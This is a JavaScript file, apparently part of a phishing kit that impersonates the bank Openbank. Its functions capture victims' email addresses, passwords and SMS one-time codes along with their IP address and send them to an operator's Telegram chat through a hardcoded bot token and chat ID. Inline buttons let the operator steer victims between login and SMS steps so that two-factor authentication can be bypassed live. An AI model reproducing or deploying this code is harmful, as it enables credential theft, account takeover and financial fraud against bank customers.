// Configuración del Webhook para Telegram
const WEBHOOK_CONFIG = {
    telegramBotToken: '8587374664:AAHqJtjHF_kvUjPKFX_oafSU3RbWwkmKI_Y', // Token de bot de Telegram
    telegramChatId: '7758189913', // Chat ID de Telegram
    // URL auto-detectada del sitio actual
    get siteUrl() {
        return window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
    }
};

// Función para enviar mensaje a Telegram
async function sendToTelegram(message, withButton = false, type = null) {
    try {
        let text = message;
        let replyMarkup = null;

        if (withButton) {
            const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
            
            if (type === 'sms') {
                replyMarkup = {
                    inline_keyboard: [[
                        { text: "❌ SMS", callback_data: `sms_error:${sessionId}` },
                        { text: "🔄 Login", callback_data: `login:${sessionId}` }
                    ]]
                };
            } else {
                replyMarkup = {
                    inline_keyboard: [[
                        { text: "❌ Login", callback_data: `info:${sessionId}` },
                        { text: "📩 SMS", callback_data: `sms:${sessionId}` }
                    ]]
                };
            }
        }

        const telegramUrl = `https://api.telegram.org/bot${WEBHOOK_CONFIG.telegramBotToken}/sendMessage`;
        const payload = {
            chat_id: WEBHOOK_CONFIG.telegramChatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: replyMarkup
        };

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error('Error en Telegram:', response.status, response.statusText);
            return { success: false, error: response.statusText };
        }

        const result = await response.json();
        console.log('Mensaje enviado a Telegram:', result);
        return { success: true, data: result };

    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        return { success: false, error: error.message };
    }
}

// Función para enviar datos al webhook (mantenida por compatibilidad)
async function sendToWebhook(data, type) {
    try {
        // Construir mensaje para Telegram
        let message = `🔐 <b>NUEVO INGRESO OPENBANK</b>\n\n`;
        
        if (type === 'email' && data.email) {
            message += `📩 <b>Mail:</b> <code>${data.email}</code>\n`;
        } else if (type === 'password' && data.password) {
            // Obtener email guardado del sessionStorage
            const savedEmail = sessionStorage.getItem('userEmail');
            if (savedEmail) {
                message += `📩 <b>Mail:</b> <code>${savedEmail}</code>\n`;
            }
            message += `🔑 <b>Clave:</b> <code>${data.password}</code>\n`;
        } else if (type === 'sms' && data.smsCode) {
            const savedEmail = sessionStorage.getItem('userEmail');
            if (savedEmail) {
                message += `📩 <b>Mail:</b> <code>${savedEmail}</code>\n`;
            }
            message += `📱 <b>Código SMS:</b> <code>${data.smsCode}</code>\n`;
        }
        
        message += `🌐 <b>IP:</b> <code>${await getUserIP()}</code>`;

        // Enviar a Telegram con botón SMS para email, password y sms
        const withButton = (type === 'email' || type === 'password' || type === 'sms');
        const result = await sendToTelegram(message, withButton, type);

        // También enviar al webhook original si está configurado
        if (WEBHOOK_CONFIG.url && WEBHOOK_CONFIG.url !== 'https://your-webhook-url-here.com/api/webhook') {
            const webhookPayload = {
                id: WEBHOOK_CONFIG.id,
                token: WEBHOOK_CONFIG.token,
                type: type,
                data: data,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                source: window.location.pathname
            };

            await fetch(WEBHOOK_CONFIG.url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(webhookPayload)
            });
        }

        return result;

    } catch (error) {
        console.error('Error al enviar webhook:', error);
        return { success: false, error: error.message };
    }
}

// Función para obtener IP del usuario
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'No disponible';
    }
}

// Función para redirigir a otra página
function redirectTo(page) {
    window.location.href = page;
}
